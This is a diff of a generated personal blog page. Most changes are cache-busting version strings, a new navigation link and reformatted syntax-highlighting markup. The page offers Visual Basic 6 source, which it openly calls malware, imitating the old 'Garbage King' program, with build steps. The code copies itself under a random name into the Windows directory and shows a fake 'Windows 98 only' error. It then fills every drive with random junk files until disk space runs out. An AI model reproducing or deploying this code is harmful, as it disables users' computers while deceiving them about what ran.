@@ -2,7 +2,7 @@
 <html>
 <head>
 	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>无聊之作，仿曾经的垃圾大王 - Fenying</title><link rel="icon" type="image/png" href="/logo/32x32.png?sv=1581142659" /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>无聊之作，仿曾经的垃圾大王 - Fenying</title><link rel="icon" type="image/png" href="/logo/32x32.png?sv=1582887249" /><meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta property="og:title" content="无聊之作，仿曾经的垃圾大王" />
 <meta property="og:description" content="一个恶意程序源码，源自于曾经在《电脑报》上看过的恶意程序“垃圾大王”。" />
 <meta property="og:type" content="article" />
@@ -12,10 +12,10 @@
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="无聊之作，仿曾经的垃圾大王"/>
 <meta name="twitter:description" content="一个恶意程序源码，源自于曾经在《电脑报》上看过的恶意程序“垃圾大王”。"/>
-<link rel="stylesheet" type="text/css" media="screen" href="https://fenying.github.io/css/normalize.css?sv=1581142659" />
-	<link rel="stylesheet" type="text/css" media="screen" href="https://fenying.github.io/css/main.css?sv=1581142659" />
+<link rel="stylesheet" type="text/css" media="screen" href="https://fenying.github.io/css/normalize.css?sv=1582887249" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://fenying.github.io/css/main.css?sv=1582887249" />
 
-		<script src="https://fenying.github.io/js/main.js?sv=1581142659"></script>
+		<script src="https://fenying.github.io/js/main.js?sv=1582887249"></script>
 </head>
 
 <body>
@@ -24,7 +24,7 @@
 	
 		<div class="avatar">
 			<a href="https://fenying.github.io/">
-				<img src="/logo/128x128.png?sv=1581142659" alt="Fenying" />
+				<img src="/logo/128x128.png?sv=1582887249" alt="Fenying" />
 			</a>
 		</div>
 	
@@ -48,6 +48,10 @@
 			
 			<li>
 				<a href="/books/">Books</a>
+			</li>
+			
+			<li>
+				<a href="/project/">Projects</a>
 			</li>
 			
 			<li>
@@ -127,9 +131,9 @@
 <p>本程序用Visual Basic 6.0打造，在Visual Basic 6.0 简体中文企业版 + Windows XP Professional SP3 简体中文版中测试通过。</p>
 <p>启动VB6.0，新建一个“标准EXE”，修改工程名为“RTools”，添加一个模块，添加如下代码</p>
 <div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-vb" data-lang="vb"><span style="color:#008000">&#39;//Declare APIs.
-</span><span style="color:#008000"></span><span style="color:#00f">Private</span> <span style="color:#00f">Declare</span> <span style="color:#00f">Function</span> GetWindowsDirectory <span style="color:#00f">Lib</span> <span style="color:#a31515">&#34;</span><span style="color:#a31515">kernel32</span><span style="color:#a31515">&#34;</span> <span style="color:#00f">Alias</span> <span style="color:#a31515">&#34;</span><span style="color:#a31515">GetWindowsDirectoryA</span><span style="color:#a31515">&#34;</span> (<span style="color:#00f">ByVal</span> lpBuffer <span style="color:#00f">As</span> <span style="color:#2b91af">String</span>, <span style="color:#00f">ByVal</span> nSize <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>) <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
-<span style="color:#00f">Private</span> <span style="color:#00f">Declare</span> <span style="color:#00f">Function</span> GetDiskFreeSpace <span style="color:#00f">Lib</span> <span style="color:#a31515">&#34;</span><span style="color:#a31515">kernel32</span><span style="color:#a31515">&#34;</span> <span style="color:#00f">Alias</span> <span style="color:#a31515">&#34;</span><span style="color:#a31515">GetDiskFreeSpaceA</span><span style="color:#a31515">&#34;</span> (<span style="color:#00f">ByVal</span> lpRootPathName <span style="color:#00f">As</span> <span style="color:#2b91af">String</span>, lpSectorsPerCluster <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, lpBytesPerSector <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, lpNumberOfFreeClusters <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, lpTotalNumberOfClusters <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>) <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
-<span style="color:#00f">Private</span> <span style="color:#00f">Declare</span> <span style="color:#00f">Function</span> GetLogicalDriveStrings <span style="color:#00f">Lib</span> <span style="color:#a31515">&#34;</span><span style="color:#a31515">kernel32</span><span style="color:#a31515">&#34;</span> <span style="color:#00f">Alias</span> <span style="color:#a31515">&#34;</span><span style="color:#a31515">GetLogicalDriveStringsA</span><span style="color:#a31515">&#34;</span> (<span style="color:#00f">ByVal</span> nBufferLength <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, <span style="color:#00f">ByVal</span> lpBuffer <span style="color:#00f">As</span> <span style="color:#2b91af">String</span>) <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
+</span><span style="color:#008000"></span><span style="color:#00f">Private</span> <span style="color:#00f">Declare</span> <span style="color:#00f">Function</span> GetWindowsDirectory <span style="color:#00f">Lib</span> <span style="color:#a31515">&#34;kernel32&#34;</span> <span style="color:#00f">Alias</span> <span style="color:#a31515">&#34;GetWindowsDirectoryA&#34;</span> (<span style="color:#00f">ByVal</span> lpBuffer <span style="color:#00f">As</span> <span style="color:#2b91af">String</span>, <span style="color:#00f">ByVal</span> nSize <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>) <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
+<span style="color:#00f">Private</span> <span style="color:#00f">Declare</span> <span style="color:#00f">Function</span> GetDiskFreeSpace <span style="color:#00f">Lib</span> <span style="color:#a31515">&#34;kernel32&#34;</span> <span style="color:#00f">Alias</span> <span style="color:#a31515">&#34;GetDiskFreeSpaceA&#34;</span> (<span style="color:#00f">ByVal</span> lpRootPathName <span style="color:#00f">As</span> <span style="color:#2b91af">String</span>, lpSectorsPerCluster <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, lpBytesPerSector <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, lpNumberOfFreeClusters <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, lpTotalNumberOfClusters <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>) <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
+<span style="color:#00f">Private</span> <span style="color:#00f">Declare</span> <span style="color:#00f">Function</span> GetLogicalDriveStrings <span style="color:#00f">Lib</span> <span style="color:#a31515">&#34;kernel32&#34;</span> <span style="color:#00f">Alias</span> <span style="color:#a31515">&#34;GetLogicalDriveStringsA&#34;</span> (<span style="color:#00f">ByVal</span> nBufferLength <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>, <span style="color:#00f">ByVal</span> lpBuffer <span style="color:#00f">As</span> <span style="color:#2b91af">String</span>) <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
 
 <span style="color:#008000">&#39;//Define Type
 </span><span style="color:#008000"></span><span style="color:#00f">Private</span> Type Disk
@@ -144,7 +148,7 @@
 </span><span style="color:#008000"></span>    <span style="color:#00f">Dim</span> sTmp <span style="color:#00f">As</span> <span style="color:#2b91af">String</span> * 200
     <span style="color:#00f">Dim</span> Length <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>
     Length = GetWindowsDirectory(sTmp, 200)
-    WindowsPath = Left(sTmp, Length) &amp; <span style="color:#a31515">&#34;</span><span style="color:#a31515">\</span><span style="color:#a31515">&#34;</span>
+    WindowsPath = Left(sTmp, Length) &amp; <span style="color:#a31515">&#34;\&#34;</span>
 <span style="color:#00f">End</span> <span style="color:#00f">Function</span>
 
 <span style="color:#00f">Private</span> <span style="color:#00f">Function</span> RandomStr(Length <span style="color:#00f">As</span> <span style="color:#2b91af">Long</span>) <span style="color:#008000">&#39;//Make random string for FileName.
@@ -157,11 +161,11 @@
 
 <span style="color:#00f">Public</span> <span style="color:#00f">Sub</span> Main()
 
-    <span style="color:#00f">If</span> LCase(Mid(App.Path, 4, Len(App.Path) - 3)) &lt;&gt; <span style="color:#a31515">&#34;</span><span style="color:#a31515">windows</span><span style="color:#a31515">&#34;</span> <span style="color:#00f">Then</span> <span style="color:#008000">&#39;//Hide this program.
-</span><span style="color:#008000"></span>        SPath = WindowsPath &amp; RandomStr(Int(Rnd * 16) + 1) &amp; <span style="color:#a31515">&#34;</span><span style="color:#a31515">.exe</span><span style="color:#a31515">&#34;</span>
-        FileCopy App.Path &amp; IIf(Len(App.Path) = 3, App.EXEName &amp; <span style="color:#a31515">&#34;</span><span style="color:#a31515">.exe</span><span style="color:#a31515">&#34;</span>, <span style="color:#a31515">&#34;</span><span style="color:#a31515">\</span><span style="color:#a31515">&#34;</span> &amp; App.EXEName &amp; <span style="color:#a31515">&#34;</span><span style="color:#a31515">.exe</span><span style="color:#a31515">&#34;</span>), SPath
+    <span style="color:#00f">If</span> LCase(Mid(App.Path, 4, Len(App.Path) - 3)) &lt;&gt; <span style="color:#a31515">&#34;windows&#34;</span> <span style="color:#00f">Then</span> <span style="color:#008000">&#39;//Hide this program.
+</span><span style="color:#008000"></span>        SPath = WindowsPath &amp; RandomStr(Int(Rnd * 16) + 1) &amp; <span style="color:#a31515">&#34;.exe&#34;</span>
+        FileCopy App.Path &amp; IIf(Len(App.Path) = 3, App.EXEName &amp; <span style="color:#a31515">&#34;.exe&#34;</span>, <span style="color:#a31515">&#34;\&#34;</span> &amp; App.EXEName &amp; <span style="color:#a31515">&#34;.exe&#34;</span>), SPath
         Shell SPath
-        MsgBox <span style="color:#a31515">&#34;</span><span style="color:#a31515">错误：本程序不能在非 Windows 98 下运行！</span><span style="color:#a31515">&#34;</span>, vbCritical
+        MsgBox <span style="color:#a31515">&#34;错误：本程序不能在非 Windows 98 下运行！&#34;</span>, vbCritical
         <span style="color:#00f">End</span>
     <span style="color:#00f">End</span> <span style="color:#00f">If</span>
 
@@ -170,7 +174,7 @@
 
     GetLogicalDriveStrings 255, StrBuf <span style="color:#008000">&#39;//Get all Disks
 </span><span style="color:#008000"></span>
-    Temp = Split(Replace(StrBuf, Chr<span style="">$</span>(0), <span style="color:#a31515">&#34;</span><span style="color:#a31515">&#34;</span>), <span style="color:#a31515">&#34;</span><span style="color:#a31515">:\</span><span style="color:#a31515">&#34;</span>)
+    Temp = Split(Replace(StrBuf, Chr<span style="">$</span>(0), <span style="color:#a31515">&#34;&#34;</span>), <span style="color:#a31515">&#34;:\&#34;</span>)
 
     R = UBound(Temp) - 1
 
@@ -178,7 +182,7 @@
 
     <span style="color:#00f">For</span> i = 0 <span style="color:#00f">To</span> R <span style="color:#008000">&#39;//Get the free space of each Disk
 </span><span style="color:#008000"></span>        DoEvents
-        D(i).Driver = Temp(i) &amp; <span style="color:#a31515">&#34;</span><span style="color:#a31515">:\</span><span style="color:#a31515">&#34;</span>
+        D(i).Driver = Temp(i) &amp; <span style="color:#a31515">&#34;:\&#34;</span>
         GetDiskFreeSpace D(i).Driver, TEMP1, TEMP2, TEMP3, x
         D(i).FreeSpece = TEMP1 * TEMP2 * (TEMP3 / 1024 / 1024)
     <span style="color:#00f">Next</span>
@@ -190,8 +194,8 @@
         <span style="color:#00f">For</span> x = 1 <span style="color:#00f">To</span> D(i).FreeSpece <span style="color:#008000">&#39;//Begin to fill each disk.
 </span><span style="color:#008000"></span>            DoEvents
             <span style="color:#00f">On</span> <span style="color:#00f">Error</span> <span style="color:#00f">Resume</span> <span style="color:#00f">Next</span>
-            Open D(i).Driver &amp; RandomStr(Int(Rnd * 32) + 1) &amp; <span style="color:#a31515">&#34;</span><span style="color:#a31515">.</span><span style="color:#a31515">&#34;</span> &amp; RandomStr(Int(Rnd * 6) + 1) <span style="color:#00f">For</span> Random <span style="color:#00f">As</span> #1
-                Put #1, 1024 * 8, <span style="color:#a31515">&#34;</span><span style="color:#a31515">&#34;</span>
+            Open D(i).Driver &amp; RandomStr(Int(Rnd * 32) + 1) &amp; <span style="color:#a31515">&#34;.&#34;</span> &amp; RandomStr(Int(Rnd * 6) + 1) <span style="color:#00f">For</span> Random <span style="color:#00f">As</span> #1
+                Put #1, 1024 * 8, <span style="color:#a31515">&#34;&#34;</span>
             Close #1
         <span style="color:#00f">Next</span>
     <span style="color:#00f">Next</span>
@@ -234,7 +238,7 @@
 	</div>
 	<div class="footer wrapper">
 	<nav class="nav">
-		<div>Last updated on 2020-02-08</div>
+		<div>Last updated on 2020-02-28</div>
 		<div>
 			 © Copyright 2020 Angus Fenying  |
 			Power by <a href="https://gohugo.io/" target="_blank" title="Hugo">Hugo</a> |
